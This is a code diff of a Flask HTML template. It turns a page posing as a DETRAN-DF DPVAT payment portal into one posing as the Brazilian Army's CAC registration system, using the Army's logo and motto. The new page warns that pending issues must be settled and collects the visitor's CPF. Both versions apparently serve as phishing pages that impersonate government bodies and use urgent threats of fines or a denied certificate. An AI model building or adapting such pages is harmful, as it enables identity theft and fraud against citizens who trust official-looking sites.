@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal DPVAT - Emissão</title>
+    <title>Portal CAC - Exército Brasileiro</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -32,7 +32,7 @@
             theme: {
                 extend: {
                     colors: {
-                        'custom-blue': '#225BAC',
+                        'custom-green': '#115E2F',
                         'custom-yellow': '#F7CD04',
                     }
                 }
@@ -44,40 +44,32 @@
     <div class="bg-white py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <img src="https://www.eb.mil.br/image/layout_set_logo?img_id=2784964&t=1674070423784" alt="Logo do Exército Brasileiro" class="h-16 mb-2" />
                 <div>
-                    <p class="text-black text-[10px] leading-tight">
-                        SECRETARIA DE ESTADO DE ECONOMIA
+                    <p class="text-black text-sm leading-tight font-bold">
+                        EXÉRCITO BRASILEIRO
                     </p>
-                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
-                        DETRAN - Distrito Federal
+                    <p id="state-text" class="text-black text-sm leading-tight">
+                        Braço Forte - Mão Amiga
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="bg-custom-blue py-3 shadow-md">
-        <div class="container mx-auto px-4 flex items-center">
-            <button class="text-white text-2xl mr-4">
-                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-1.5 h-1.5 bg-white"></div>
-                </div>
-            </button>
-            <span class="text-white text-xl drop-shadow-sm">EMITIR DPVAT</span>
+    <div class="bg-custom-green py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center justify-center">
+            <span class="text-white text-xl drop-shadow-sm">SISTEMA DE REGISTRO CAC</span>
         </div>
     </div>
 
     <div class="container mx-auto px-4 py-4">
-        <div class="bg-custom-yellow bg-opacity-20 rounded-lg p-4 mb-6">
+        <div class="bg-yellow-100 rounded-lg p-4 mb-6">
             <div class="flex items-start">
-                <i class="fas fa-exclamation-triangle text-custom-yellow text-xl mr-3"></i>
+                <i class="fas fa-exclamation-triangle text-yellow-600 text-xl mr-3"></i>
                 <div>
-                    <p class="font-bold mb-1">DPVAT 2025 - Lei Federal 14.689/2023</p>
-                    <p class="text-sm">O Governo Federal restabeleceu a cobrança do seguro DPVAT a partir de Janeiro de 2025. O não pagamento até o final de Janeiro resultará em multas e juros adicionais.</p>
+                    <p class="font-bold mb-1">AVISO IMPORTANTE</p>
+                    <p class="text-sm">Prezado(a) Candidato(a) ao Certificado de Registro (CAC), informamos que para a conclusão do processo de cadastramento é imprescindível o acesso ao portal e a regularização de eventuais pendências identificadas. A não regularização das pendências impossibilitará a emissão do certificado, conforme previsto na legislação vigente.</p>
                 </div>
             </div>
         </div>
@@ -85,38 +77,25 @@
 
     <div class="container mx-auto px-4 pb-8 flex-grow">
         <div class="bg-white rounded shadow p-6">
-            <form id="consultaForm" method="POST" action="{{ url_for('consultar') }}">
-                <p class="mb-4">Informe a placa do veículo:</p>
+            <form id="consultaForm" method="POST" action="{{ url_for('consultar_cpf') }}">
+                <p class="mb-4">Informe seu CPF para consulta:</p>
                 <div class="relative mb-4">
-                    <label class="block text-gray-700 text-sm font-bold mb-2" for="placa">Placa:</label>
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
                     <div class="relative">
-                        <input class="appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline uppercase"
-                               id="placa"
-                               name="placa"
+                        <input class="appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                               id="cpf"
+                               name="cpf"
                                type="text" 
-                               maxlength="7"
-                               pattern="[A-Z0-9]{7}"
+                               maxlength="11"
+                               pattern="[0-9]{11}"
+                               placeholder="Digite apenas números"
                                required />
                         <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
-                            <i class="fas fa-car text-gray-500"></i>
+                            <i class="fas fa-id-card text-gray-500"></i>
                         </div>
                     </div>
                 </div>
-                <div class="mb-4">
-                    <label class="block text-gray-700 text-sm font-bold mb-2" for="exercicio">Exercício:</label>
-                    <div class="relative">
-                        <select class="block appearance-none w-full bg-white border border-gray-400 hover:border-gray-500 px-4 py-2 pr-8 rounded shadow leading-tight focus:outline-none focus:shadow-outline"
-                                id="exercicio"
-                                name="exercicio">
-                            <option value="2025">2025</option>
-                        </select>
-                        <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
-                            <i class="fas fa-chevron-down"></i>
-                        </div>
-                    </div>
-                    <p class="text-gray-700 text-xs italic">Escolha o exercício.</p>
-                </div>
-                <button type="submit" id="submitBtn" class="bg-custom-blue hover:bg-opacity-90 text-white font-bold py-2 px-4 rounded w-full flex items-center justify-center space-x-2">
+                <button type="submit" id="submitBtn" class="bg-custom-green hover:bg-opacity-90 text-white font-bold py-2 px-4 rounded w-full flex items-center justify-center space-x-2">
                     <span>Consultar</span>
                     <i class="fas fa-search ml-2"></i>
                 </button>
@@ -133,11 +112,10 @@
         </div>
     </div>
 
-    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
-        <p class="text-sm">© Secretaria de Estado de Economia. Todos os direitos reservados.</p>
+    <div class="bg-custom-green text-white text-center py-3 mt-auto">
+        <p class="text-sm">© {{ current_year }} Exército Brasileiro. Todos os direitos reservados.</p>
     </div>
 
-    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
     <script>
         document.getElementById('consultaForm').addEventListener('submit', function(e) {
             const submitBtn = document.getElementById('submitBtn');
@@ -150,6 +128,14 @@
             btnText.textContent = 'Consultando...';
             btnIcon.classList.remove('fa-search');
             btnIcon.classList.add('fa-circle-notch', 'animate-spin');
+        });
+
+        // Máscara para CPF
+        const cpfInput = document.getElementById('cpf');
+        cpfInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            e.target.value = value;
         });
     </script>
 </body>
